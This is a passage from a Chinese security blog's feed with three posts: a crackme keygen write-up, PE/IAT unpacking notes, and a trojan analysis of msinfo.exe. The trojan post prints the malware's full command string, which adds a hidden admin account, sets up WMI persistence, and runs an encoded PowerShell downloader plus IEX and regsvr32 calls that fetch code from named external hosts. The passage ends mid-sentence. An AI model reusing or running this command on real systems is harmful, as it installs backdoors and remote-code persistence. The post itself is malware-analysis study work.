    <content type="html"><![CDATA[<blockquote><p>一面自我感觉还行? 然后 “优先考虑能直接工作的” 我出国2333333 但面试的过程中也学到了很多东西 能一对一对话非常棒</p></blockquote><a id="more"></a><h2 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h2><p>是MFC文件 没有加壳 打开之后有两种注册方式 这次只分析了注册方式一<br><img src="/2019/03/26/腾讯游戏安全部门面试题-CrackXX-exe/界面.png" alt></p><p>用xspy工具获取按钮事件的处理函数</p><p>Button1 的处理函数地址0x401620<br><br>Button2 的处理函数地址0x401840<br><br><img src="/2019/03/26/腾讯游戏安全部门面试题-CrackXX-exe/控件ID.png" alt></p><h2 id="注册方式一"><a href="#注册方式一" class="headerlink" title="注册方式一"></a>注册方式一</h2><h3 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h3><p>用IDA打开 发现里面有很多未识别成函数的代码 手动按P 从当前地址处解析成函数</p><p>button1的概览:<br><img src="/2019/03/26/腾讯游戏安全部门面试题-CrackXX-exe/button1.png" alt></p><ol><li>username 1937 5 通过 <code>411980</code>函数生成得到 v9</li><li><code>406420</code>函数 对v9 v6进行check</li><li>相等函数返回0 验证通过 sendmessage 1</li></ol><h3 id="sub-406420-v5-v7-v8-v9"><a href="#sub-406420-v5-v7-v8-v9" class="headerlink" title="sub_406420(v5,v7,v8,v9)"></a>sub_406420(v5,v7,v8,v9)</h3><p>跟进最主要的变化函数 <code>sub_406420(v5,v7,v8,v9)</code><br><img src="/2019/03/26/腾讯游戏安全部门面试题-CrackXX-exe/change.png" alt><br>参数v9对应函数里的v12 涉及到 v12值的变化的函数 分别有<code>sub_40A940</code> 和 <code>sub_40DDB0</code></p><p><code>sub_40A940</code> 执行两次后 跟着执行一次 <code>sub_40DDB0</code> 三次变化得到 <code>v12(v9)</code>的值</p><h3 id="sub-40A940-v12-a3-amp-v12"><a href="#sub-40A940-v12-a3-amp-v12" class="headerlink" title="sub_40A940(v12,a3,&amp;v12)"></a>sub_40A940(v12,a3,&amp;v12)</h3><p><img src="/2019/03/26/腾讯游戏安全部门面试题-CrackXX-exe/平方.png" alt><br>主要是三个函数 第一个是开辟空间</p><p>第二个函数<code>sub_40A280</code> 输入password=10 通过观察数据变化<br>得到结果 <code>sub_40A280</code>-&gt; 通过 password生成 <code>dword_4657EC=password**2</code><br><img src="/2019/03/26/腾讯游戏安全部门面试题-CrackXX-exe/40A940.png" alt></p><p>第三个函数<code>sub_40A5D0</code> 作用是 对<code>dword_4657EC=password**2</code>进行mod 1937的操作 </p><p>最终 sub_40A940(v12,a3,&amp;v12)-&gt; <code>v12=password**2 % 1937</code></p><h3 id="sub-40DDB0-dword-46586C-v12-a3-amp-v12"><a href="#sub-40DDB0-dword-46586C-v12-a3-amp-v12" class="headerlink" title="sub_40DDB0(dword_46586C,v12,a3,&amp;v12)"></a>sub_40DDB0(dword_46586C,v12,a3,&amp;v12)</h3><p>dword_46586C 在前面有赋初始值<br><img src="/2019/03/26/腾讯游戏安全部门面试题-CrackXX-exe/初始值.png" alt></p><p>整个函数流程与上一个函数<code>sub_40A940(v12,a3,&amp;v12)</code>相似<br><img src="/2019/03/26/腾讯游戏安全部门面试题-CrackXX-exe/sub_40DDB0.png" alt></p><h3 id="验证流程"><a href="#验证流程" class="headerlink" title="验证流程"></a>验证流程</h3><ol><li>t1= passw ** 2 % 1937</li><li>t2= t1 ** 2 % 1937</li><li>result = t2 * passw % 1937</li><li>if result == username: success</li></ol><h3 id="注册机流程梳理"><a href="#注册机流程梳理" class="headerlink" title="注册机流程梳理"></a>注册机流程梳理</h3><p>没考虑多解问题</p><ol><li>输入username</li><li>简化为 判断是否满足 <code>password^5 ≡ username mod 1937</code></li></ol><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="literal">user</span>=input()</span><br><span class="line">if ((<span class="literal">user</span>&gt;<span class="number">1936</span>) or (<span class="literal">user</span>&lt;<span class="number">1</span>)):</span><br><span class="line">    <span class="literal">print</span> <span class="string">"error"</span></span><br><span class="line">else:</span><br><span class="line">    for passw in range(<span class="number">1</span>, <span class="number">1937</span>):</span><br><span class="line">        if passw ** <span class="number">5</span> % <span class="number">1937</span> == <span class="literal">user</span>:</span><br><span class="line">            <span class="literal">print</span> <span class="literal">user</span>, passw</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><p><img src="/2019/03/26/腾讯游戏安全部门面试题-CrackXX-exe/result.png" alt></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;一面自我感觉还行? 然后 “优先考虑能直接工作的” 我出国2333333 但面试的过程中也学到了很多东西 能一对一对话非常棒&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="Writeup" scheme="http://Ronpa.top/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>PE文件格式/ IAT 学习笔记</title>
    <link href="http://ronpa.top/2019/02/28/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://ronpa.top/2019/02/28/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2019-02-28T19:55:48.000Z</published>
    <updated>2021-02-15T21:53:07.274Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>开了好久好久的坑 填上了/ 后续补写一些基础知识当做补缺/ 全是转载 不是原创/ PE; IAT</p></blockquote><a id="more"></a><h1 id="1-IAT-为什么脱壳后要修复IAT"><a href="#1-IAT-为什么脱壳后要修复IAT" class="headerlink" title="1. IAT (为什么脱壳后要修复IAT)"></a>1. IAT (为什么脱壳后要修复IAT)</h1><p>导入表= 输入表(IT import table, 内置结构是IID: IMAGE_IMPORT_DESCRIPTOR 一个dll对应一个导入表)<br><br>IAT 导入地址表<br><br>INT 导入名称表<br></p><p><a href="https://bbs.pediy.com/thread-151939.htm" target="_blank" rel="noopener">原帖</a></p><h2 id="1-1-程序调用DLL导出函数的原理"><a href="#1-1-程序调用DLL导出函数的原理" class="headerlink" title="1.1 程序调用DLL导出函数的原理"></a>1.1 程序调用DLL导出函数的原理</h2><p>PE调用DLL里的函数，一般是先加载这个DLL模块到它的进程地址空间，然后在加载后的地址范围内找到每个调用函数的地址，在程序中你可以使用<code>LoadLibrary()</code>这个系统API去动态去加载某个DLL，再通过<code>GetProcAddress()</code>系统API来找到DLL导出的某个函数地址，得到函数地址了你才能使用这个函数。<br>用户DLL被加载后的基址可发生变化，导入的函数地址不是固定的，你不能使用固定的地址。<br>系统DLL虽然基址固定，函数地址固定，但是一般不会直接使用函数硬地址，<br>还是要<code>GetProcAddress()</code>这个API来得到地址，因为XP、win7等每个系统的这些地址<br>是不一样的，会导致兼容性问题。</p><p><strong>个人总结:</strong></p><ol><li>PE调用非本程序的函数需要加载 dll(就和Python/ java 调库导包一样)</li><li>加载这个DLL模块到它的进程地址空间后, 再查询寻找加载后的目标函数的地址,才能使用函数</li><li>DLL加载后地址不固定, 所以需要使用特定API获取函数在内存中的地址</li></ol><p><img src="/2019/02/28/PE文件格式学习笔记/1-1.png" alt></p><h2 id="1-2-导入表IAT"><a href="#1-2-导入表IAT" class="headerlink" title="1.2 导入表IAT"></a>1.2 导入表IAT</h2><p>而为了开发更方便和更人性化，编译器提供了这个静态导入函数的功能，也就是说你在编程的时候不需要<code>LoadLibrary()</code>，不必每次调用一个函数都<code>GetProcAddress()</code>，你只需要在源代码中写函数名和参数即可，编译器会将你使用的&lt;函数名&gt;和函数所在的&lt;DLL文件名&gt;<br>两个信息填写到输入表里，当程序启动运行时由操作系统根据这两个信息给程序加载<br>所需的DLL，并将所需要的函数地址写入IAT。IAT是指PE导入地址表，每个IAT就对应了一个DLL文件导入函数的地址表，你的程序里调用的地址不是直接调用DLL里函数的地址，因为你不知道地址是多少，而是直接调用了<code>IAT(导入地址表)</code>里的地址。程序启动时操作系统加载所需的DLL并填充导入名称表<code>INT(导入名称表)</code>对应的函数地址到地址表IAT对应<code>IMAGE_THUNK_DATA</code>结构里，然后程序就可以正常调用IAT中这些函数地址了。</p><p><strong>个人总结:</strong></p><ol><li>所以 编译器先把 你要加载的 DLL 和 目标函数整理好, 并在程序启动时系统自动找到地址写到IAT地址导入表中(每个DLL对应一个IAT 里面存着函数在内存里的地址)</li><li>程序调用函数的时候 先去IAT里找函数地址, 然后调用</li></ol><h2 id="1-3-壳的工作原理"><a href="#1-3-壳的工作原理" class="headerlink" title="1.3 壳的工作原理"></a>1.3 壳的工作原理</h2><p>某些加壳程序加壳后会修改了原来导入目录表的位置为壳的导入表，这样默认的导入表指向壳部分的导入表，你就看不到原来的导入表的内容了。<br>程序启动后，操作系统为壳的导入表加载，在壳代码运行完成之后，壳代码会跳到原程序的入口点OEP，壳模拟操作系统填充原来导入表IAT，这样保证代码段能正常调用函数。<br>一般壳的工作原理也就是这样了，随着现在加壳加密技术的进步，不是所有加壳软件都会这样。</p><p><strong>个人总结:</strong></p><ol><li>壳会修改导入表成壳本身的导入表</li><li>壳代码运行完成, 自解压的结束的时候壳会模拟操作系统填充程序原来的IAT 保证代码段调用函数.</li><li>所以手动脱壳之后 只是dump了完成自解压的程序 是不够的, IAT还是壳程序的IAT</li></ol><h2 id="1-4-脱壳原理"><a href="#1-4-脱壳原理" class="headerlink" title="1.4 脱壳原理"></a>1.4 脱壳原理</h2><ol><li>首先修改被加壳程序的入口点到程序原来的OEP.(单步跟踪之类的)</li><li>然后修改PE程序导入表目录地址为原来导入表地址，或者新建一个节.</li><li>将这个新节作为导入表节，并将原导入表内容写入新节导入表.(修补IAT)</li></ol><h2 id="1-5-脱壳过程"><a href="#1-5-脱壳过程" class="headerlink" title="1.5 脱壳过程"></a>1.5 脱壳过程</h2><ol><li>OD跟踪，让壳运行到原程序OEP（不一定非得OEP，程序领空导入表一般都是处于还原状态，OEP要知道</li><li>这时候可以用PE DUMP脱壳插件或者用LordPe等工具脱壳，程序当前的内存映像被dump出来，里面IAT结构完整很容易被发现。</li><li>dump后程序不能正常运行很可能是导入表位置错误（也可能是程序有自校验），因为dump出来的只是内存中的映像快照，<strong>导入表目录还是指向壳的导入表</strong>，这时，需要用导入表修复软件查找dump出的PE文件<strong>原导入表首地址</strong>，然后修正导入表目录中导入表的位置，或重建导入表。(修复IAT)</li><li><code>Import Fix</code>导入表修复软件会新建一个节来保存原导入表数据，并将导入表目录指向新节导入表位置。在搜索导入表时可能导入表被破坏，Import Fix会识别出一些无效的IAT项，可以将其剔除掉。 <strong>一般直接上OD插件修复IAT</strong></li></ol><h1 id="2-PE的基本概念"><a href="#2-PE的基本概念" class="headerlink" title="2. PE的基本概念"></a>2. PE的基本概念</h1><p>PE(Portable Executable)指的是win上的可执行文件格式,<strong>是一个大类里面包括如exe、dll、vxd、sys和vdm等</strong>, win16平台上是 NE格式(遥远的过去完全没接触过), win32/64上是PE格式,是目前win上主流的可执行文件格式</p><p><img src="/2019/02/28/PE文件格式学习笔记/PE映像.png" alt></p><p><code>.text</code> 代码段汇编</p><p><code>.data</code> 数据段 左下角一堆</p><p><code>.rsrc</code> 资源段 实实在在看到的界面 包括上面的东西logo 按钮 菜单</p><h2 id="2-1-基地址"><a href="#2-1-基地址" class="headerlink" title="2.1 基地址"></a>2.1 基地址</h2><p>ImageBase, 由PE文件自己设置的, 默认用VC++ 生成的<code>EXE</code>文件基地址是 <code>400000h</code>, <code>DLL</code>是<code>10000000h</code>, 可以改变.</p><p><strong>QUESTION?</strong> (也就是说是固定的了? 但问题是这是在内存里的地址, 内存的地址又不是只有一个exe或者dll).<br><strong>ANSWER</strong> (基地址+相对虚拟地址(RVA)=内存里的真正开始地址)</p><h2 id="2-3-虚拟地址-Virtual-Address-VA"><a href="#2-3-虚拟地址-Virtual-Address-VA" class="headerlink" title="2.3 虚拟地址 Virtual Address(VA)"></a>2.3 虚拟地址 Virtual Address(VA)</h2><h3 id="2-3-1-虚拟地址-Virtual-Address-VA"><a href="#2-3-1-虚拟地址-Virtual-Address-VA" class="headerlink" title="2.3.1 虚拟地址 Virtual Address(VA)"></a>2.3.1 虚拟地址 Virtual Address(VA)</h3><p>内存中程序真正的地址, 由磁盘文件里的各块映射而来, 顺序分布相同, 但是间隔可能不同.</p><p>虚拟地址(VA)=基地址(imagebase)+相对虚拟地址(RVA)</p><h3 id="2-3-2-相对虚拟地址-Relative-Virtual-Address-RVA"><a href="#2-3-2-相对虚拟地址-Relative-Virtual-Address-RVA" class="headerlink" title="2.3.2 相对虚拟地址 Relative Virtual Address(RVA)"></a>2.3.2 相对虚拟地址 Relative Virtual Address(RVA)</h3><p>相对于文件载入地址(基址)的偏移. </p><p>例如EXE从400000h基址载入, 某个代码区块(VA)开始于401000h,这个代码区块的RVA=1000h. </p><p>虚拟地址(VA)=基地址(imagebase)+相对虚拟地址(RVA)</p><h3 id="2-3-3-VirtualSize-amp-SizeOfRawData"><a href="#2-3-3-VirtualSize-amp-SizeOfRawData" class="headerlink" title="2.3.3 VirtualSize &amp; SizeOfRawData"></a>2.3.3 VirtualSize &amp; SizeOfRawData</h3><p><code>VirtualSize</code>: The total size of the section when loaded into memory. </p><p>If this value is greater than SizeOfRawData, the section is zero-padded. This field is valid only for executable images and should be set to zero for object files.</p><p><code>SizeOfRawData</code> The size of the section (for object files) or the size of the initialized data on disk (for image files). For executable images, this must be a multiple of FileAlignment from the optional header. If this is less than VirtualSize, the remainder of the section is zero-filled. Because the SizeOfRawData field is rounded but the VirtualSize field is not, it is possible for SizeOfRawData to be greater than VirtualSize as well. When a section contains only uninitialized data, this field should be zero.</p><p><code>VirtualSize</code>是节没有进行对齐处理前的实际大小在内存里, 而<code>SizeOfRawData</code>是节在磁盘中所占空间的大小,也就是对齐后的大小(是FileAlignment的倍数)。</p><p><img src="/2019/02/28/PE文件格式学习笔记/raw.png" alt></p><p><img src="/2019/02/28/PE文件格式学习笔记/raw2.png" alt></p><h2 id="2-4-文件偏移地址"><a href="#2-4-文件偏移地址" class="headerlink" title="2.4 文件偏移地址"></a>2.4 文件偏移地址</h2><p>当PE文件存在磁盘中的时候 某个数据相对于文件头的偏移量为<strong>文件偏移地址</strong> 或 <strong>物理地址</strong>.</p><p>从PE文件的第一个字节开始计数 起始值为0 就是用16进制查看器看到的左边的地址.</p><h1 id="3-DOS头"><a href="#3-DOS头" class="headerlink" title="3. DOS头"></a>3. DOS头</h1><p>开头是 4D 5A MZ </p><p>偏移量3C 存的是PE文件头偏移 e_flanew<br>PE文件头指针=ImageBase+dosHeader-&gt;e_flanew</p><h2 id="2-7-区块-节表地址"><a href="#2-7-区块-节表地址" class="headerlink" title="2.7 区块/节表地址"></a>2.7 区块/节表地址</h2><p>在PE文件头与原始数据间存在区块表 包含每个块在映像中的信息</p><p>指向不同的区块实体 包含位置长度属性 </p><p>该数组长度由头文件里的 NumberofSection指出</p><h3 id="2-7-1-IMAGE-SECTION-HEADER-结构"><a href="#2-7-1-IMAGE-SECTION-HEADER-结构" class="headerlink" title="2.7.1 IMAGE_SECTION_HEADER 结构"></a>2.7.1 IMAGE_SECTION_HEADER 结构</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_FILE_HEADER STRUCT</span><br><span class="line">+<span class="number">04h</span>    <span class="built_in">WORD</span>          Machine<span class="comment">;   // 运行平台</span></span><br><span class="line">+<span class="number">06h</span>      <span class="built_in">WORD</span>          NumberOfSections<span class="comment">; // 文件的区块数目</span></span><br><span class="line">+<span class="number">08h</span>    <span class="built_in">DWORD</span>         TimeDateStamp<span class="comment">;  // 文件创建日期和时间</span></span><br><span class="line">+<span class="number">0Ch</span>      <span class="built_in">DWORD</span>         PointerToSymbolTable<span class="comment">; // 指向符号表(主要用于调试)</span></span><br><span class="line">+<span class="number">10h</span>     <span class="built_in">DWORD</span>         NumberOfSymbols<span class="comment">;  // 符号表中符号个数(同上)</span></span><br><span class="line">+<span class="number">14h</span>      <span class="built_in">WORD</span>          SizeOfOptionalHeader<span class="comment">;  // IMAGE_OPTIONAL_HEADER32 结构大小</span></span><br><span class="line">+<span class="number">16h</span>      <span class="built_in">WORD</span>          Characteristics<span class="comment">;  // 文件属性</span></span><br></pre></td></tr></table></figure><h3 id="2-7-2-节表属性"><a href="#2-7-2-节表属性" class="headerlink" title="2.7.2 节表属性"></a>2.7.2 节表属性</h3><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">IMAGE_SECTION_HEADER <span class="keyword">STRUCT</span></span><br><span class="line">BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; <span class="comment">// 8个字节的节区名称</span></span><br><span class="line"><span class="built_in">union</span> Misc</span><br><span class="line">  DWORD PhysicalAddress;       </span><br><span class="line">  DWORD VirtualSize;            <span class="comment">//节区的尺寸</span></span><br><span class="line">ends</span><br><span class="line">DWORD VirtualAddress;         <span class="comment">// 节区的 RVA 地址</span></span><br><span class="line">DWORD SizeOfRawData;            <span class="comment">// 在文件中对齐后的尺寸</span></span><br><span class="line">DWORD PointerToRawData;        <span class="comment">// 在文件中的偏移量</span></span><br><span class="line">DWORD PointerToRelocations;     <span class="comment">// 在OBJ文件中使用，重定位的偏移</span></span><br><span class="line">DWORD PointerToLinenumbers;   <span class="comment">// 行号表的偏移（供调试使用地）</span></span><br><span class="line">WORD NumberOfRelocations;      <span class="comment">// 在OBJ文件中使用，重定位项数目</span></span><br><span class="line">WORD NumberOfLinenumbers;    <span class="comment">// 行号表中行号的数目</span></span><br><span class="line">DWORD Characteristics;       <span class="comment">// 节属性如可读，可写，可执行等</span></span><br></pre></td></tr></table></figure><h3 id="2-7-3-计算"><a href="#2-7-3-计算" class="headerlink" title="2.7.3 计算"></a>2.7.3 计算</h3><ol><li>循环扫描区块表得出每个区块在内存中的起始 RVA（根据IMAGE_SECTION_HEADER 中的VirtualAddress 字段），并根据区块的大小（根据IMAGE_SECTION_HEADER 中的SizeOfRawData 字段）算出区块的结束 RVA（两者相加即可），最后判断目标 RVA 是否落在该区块内。</li><li>通过步骤一定位了目标 RVA 处于具体的某个区块中后，那么用目标 RVA 减去该区块的起始 RVA ，这样就能得到目标 RVA 相对于区块起始地址的偏移量 RVA2.</li><li>在区块表中获取该区块在文件中所处的偏移地址（根据IMAGE_SECTION_HEADER 中的PointerToRawData 字段）, 将这个偏移值加上步骤二得到的 RVA2 值，就得到了真正的文件偏移地址</li></ol><h2 id="2-8-分析工具"><a href="#2-8-分析工具" class="headerlink" title="2.8 分析工具"></a>2.8 分析工具</h2><p>pe explore</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;开了好久好久的坑 填上了/ 后续补写一些基础知识当做补缺/ 全是转载 不是原创/ PE; IAT&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="Sketches" scheme="http://Ronpa.top/tags/Sketches/"/>
    
  </entry>
  
  <entry>
    <title>木马分析-msinfo.exe</title>
    <link href="http://ronpa.top/2019/02/25/%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90-msinfo-exe/"/>
    <id>http://ronpa.top/2019/02/25/%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90-msinfo-exe/</id>
    <published>2019-02-25T22:35:25.000Z</published>
    <updated>2021-01-25T19:25:30.287Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>给了两个木马文件 分别是 down.exe和 msinfo.exe<br>打算先从没加壳的 down.exe开始分析<br>后来发现不是没加壳 而是查不出 VC7++ OEP的机器码根本不对 查了一下 大概需要手动补充<br>最后发现 两个其实是同一个病毒产生的两个程序</p></blockquote><a id="more"></a><h2 id="0x00-基础信息"><a href="#0x00-基础信息" class="headerlink" title="0x00 基础信息"></a>0x00 基础信息</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">文件名称：<span class="selector-tag">C</span>:\<span class="selector-tag">Users</span>\<span class="selector-tag">Ronpa</span>\<span class="selector-tag">Desktop</span>\<span class="selector-tag">msinfo</span><span class="selector-class">.exe</span></span><br><span class="line">文件大小：4887552 字节</span><br><span class="line">文件版本：1<span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.9</span></span><br><span class="line"><span class="selector-tag">MD5</span>     ：03<span class="selector-tag">A704D98634F761D090AEAD21C7256A</span></span><br><span class="line"><span class="selector-tag">SHA1</span>    ：<span class="selector-tag">DDADF26EB9C9EEF200030EE6F9190D71666A127B</span></span><br><span class="line"><span class="selector-tag">CRC32</span>   ：676<span class="selector-tag">D51BC</span></span><br></pre></td></tr></table></figure><p>加了VMP壳<br></p><p><strike>我透 上次也是 这次也是我透 加尼玛壳啊加加加 敞开心扉不好吗???</strike><br><img src="/2019/02/25/木马分析-msinfo-exe/壳.png" alt><br>不会脱 好烦一壳</p><p>运行的时候需要用到 <code>wpcap.dll packet.dll</code> 网络底层访问驱动包里的两个库文件<br>推测是和远程连接自动联网之类的木马程序<br><br>所以很酷地直接放弃分析主程序 转而分析随着主程序产生的子程序</p><h2 id="0x02-msinfo-exe-主程序"><a href="#0x02-msinfo-exe-主程序" class="headerlink" title="0x02 msinfo.exe 主程序"></a>0x02 msinfo.exe 主程序</h2><h3 id="查找异常进程-文件"><a href="#查找异常进程-文件" class="headerlink" title="查找异常进程/文件"></a>查找异常进程/文件</h3><p>用od加载运行后 会一直运行 msinfo.exe 和 conhost.exe 这两个进程<br><img src="/2019/02/25/木马分析-msinfo-exe/异常进程.png" alt><br>按时间查找修改的文件 发现木马程序一共创建了三个文件</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="symbol">\P</span>rogram Files<span class="symbol">\C</span>ommon Files<span class="symbol">\x</span>pwpd.dat</span><br><span class="line">C:<span class="symbol">\U</span>sers<span class="symbol">\U</span>sersname<span class="symbol">\D</span>esktop<span class="symbol">\w</span>pd.dat</span><br><span class="line">C:<span class="symbol">\U</span>sers<span class="symbol">\U</span>sersname<span class="symbol">\D</span>esktop<span class="symbol">\c</span>srs.exe</span><br></pre></td></tr></table></figure><p><img src="/2019/02/25/木马分析-msinfo-exe/子文件.png" alt></p><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>主程序 msinfo.exe 通过 文件xpwpd.dat 指路下载 wpd.date 和 攻击模块csrs.exe<br>用16进制查看器直接查看文件xpwpd.dat的内部内容<br><img src="/2019/02/25/木马分析-msinfo-exe/xpwpd.png" alt></p><p>其中分别是指定了暴破胜利后用到来下载后续病毒地址等ip</p><h2 id="0x03-csrs-exe-次攻击模块"><a href="#0x03-csrs-exe-次攻击模块" class="headerlink" title="0x03  csrs.exe 次攻击模块"></a>0x03  csrs.exe 次攻击模块</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">文件名称：<span class="selector-tag">C</span>:\<span class="selector-tag">Users</span>\<span class="selector-tag">Ronpa</span>\<span class="selector-tag">Desktop</span>\<span class="selector-tag">csrs</span><span class="selector-class">.exe</span></span><br><span class="line">文件大小：6466961 字节</span><br><span class="line">文件版本：1<span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.3</span> (<span class="selector-tag">win7_rtm</span><span class="selector-class">.090713-1255</span>)</span><br><span class="line"><span class="selector-tag">MD5</span>     ：6<span class="selector-tag">B62B380B8B14B261C5BFDFE7B017CDD</span></span><br><span class="line"><span class="selector-tag">SHA1</span>    ：8475334<span class="selector-tag">BEC0E1CD376995053E3217F740166CD8B</span></span><br><span class="line"><span class="selector-tag">CRC32</span>   ：27<span class="selector-tag">F5D1F8</span></span><br></pre></td></tr></table></figure><p>主要的后续攻击模块csrs.exe 是一个用python写的 利用 pyinstaller 转成exe可执行文件的程序<br></p><h3 id="解包"><a href="#解包" class="headerlink" title="解包"></a>解包</h3><p>利用<a href="https://github.com/countercept/python-exe-unpacker" target="_blank" rel="noopener">https://github.com/countercept/python-exe-unpacker</a></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> pyinstxtractor.<span class="keyword">py</span> -i csrs.<span class="keyword">exe</span></span><br></pre></td></tr></table></figure><p>The main python file that contains the logic will usually be the file without any extension (In the folder that concatenated with “_extracted”). In the following example, “MyEploiter” is the one that contains the main python<br><img src="/2019/02/25/木马分析-msinfo-exe/mainexp.png" alt></p><h3 id="MyExploiter"><a href="#MyExploiter" class="headerlink" title="MyExploiter"></a>MyExploiter</h3><p>csrs.exe里MyExploiter包含最主要的python代码</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python python_exe_unpack<span class="selector-class">.py</span> -<span class="selector-tag">p</span> MyEploiter</span><br></pre></td></tr></table></figure><p><img src="/2019/02/25/木马分析-msinfo-exe/myexp1.png" alt><br>对目标主机执行的命令</p><pre><code>&apos;cmd /c net1 user admin$ Zxcvbnm,.1234 /ad&amp;net1 localgroup administrators admin$ /ad&amp;net1 localgroup administradores admin$ /ad&amp;wmic /NAMESPACE:&quot;\\root\\subscription&quot; PATH __EventFilter WHERE Name=&quot;fuckyoumm3&quot; DELETE&amp;wmic /NAMESPACE:&quot;\\root\\subscription&quot; PATH ActiveScriptEventConsumer WHERE Name=&quot;fuckyoumm4&quot; DELETE&amp;wmic /NAMESPACE:&quot;\\root\\subscription&quot; PATH CommandLineEventConsumer WHERE Name=&quot;fuckyoumm4&quot; DELETE&amp;wmic /NAMESPACE:&quot;\\root\\subscription&quot; PATH __FilterToConsumerBinding WHERE Filter=&quot;__EventFilter.Name=\&apos;fuckyoumm3\&apos;&quot; DELETE&amp;wmic /NAMESPACE:&quot;\\root\\subscription&quot; PATH __EventFilter CREATE Name=&quot;fuckyoumm3&quot;, EventNameSpace=&quot;root\\cimv2&quot;,QueryLanguage=&quot;WQL&quot;, Query=&quot;SELECT * FROM __InstanceModificationEvent WITHIN 10800 WHERE TargetInstance ISA \&apos;Win32_PerfFormattedData_PerfOS_System\&apos;&quot;&amp;wmic /NAMESPACE:&quot;\\root\\subscription&quot; PATH CommandLineEventConsumer CREATE Name=&quot;fuckyoumm4&quot;, CommandLineTemplate=&quot;cmd /c powershell.exe -nop -enc &quot;JAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJAB3AGMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdwBtAGkALgAxADIAMQA3AGIAeQBlAC4AaABvAHMAdAAvADIALgB0AHgAdAAnACkALgB0AHIAaQBtACgAKQAgAC0AcwBwAGwAaQB0ACAAJwBbAFwAcgBcAG4AXQArACcAfAAlAHsAJABuAD0AJABfAC4AcwBwAGwAaQB0ACgAJwAvACcAKQBbAC0AMQBdADsAJAB3AGMALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACQAXwAsACAAJABuACkAOwBzAHQAYQByAHQAIAAkAG4AOwB9AA==&quot;&amp;powershell.exe IEX (New-Object system.Net.WebClient).DownloadString(\&apos;http://wmi.1217bye.host/S.ps1\&apos;)&amp;powershell.exe IEX (New-Object system.Net.WebClient).DownloadString(\&apos;http://173.208.139.170/s.txt\&apos;)&amp;powershell.exe IEX (New-Object system.Net.WebClient).DownloadString(\&apos;http://35.182.171.137/s.jpg\&apos;)||regsvr32 /u /s /i:http://wmi.1217bye.host:8888/1.txt scrobj.dll&amp;regsvr32 /u /s /i:http://173.208.139.170/2.txt scrobj.dll&amp;regsvr32 /u /s /i:http://35.182.171.137/3.txt scrobj.dll&quot;&amp;wmic /NAMESPACE:&quot;\\root\\subscription&quot; PATH __FilterToConsumerBinding CREATE Filter=&quot;__EventFilter.Name=&quot;fuckyoumm3&quot;&quot;, Consumer=&quot;CommandLineEventConsumer.Name=&quot;fuckyoumm4&quot;&quot;&amp;start regsvr32 /s /u /n /i:http://173.208.172.202:8888\\s1.txt scrobj.dll&apos;</code></pre><p>能看到 用了ms17010漏洞对主机进行攻击 并添加了一个管理员权限的 <code>admin$</code> 的账号 密码是 <code>Zxcvbnm,.1234</code> 用于控制目标主机<br>同时下载并安装更改了从云端下下来的dll库文件 例如 <code>regsvr32 /s /u /n /i:http://173.208.172.202:8888\\s1.txt scrobj.dll</code></p><p>执行MS17010漏洞攻击 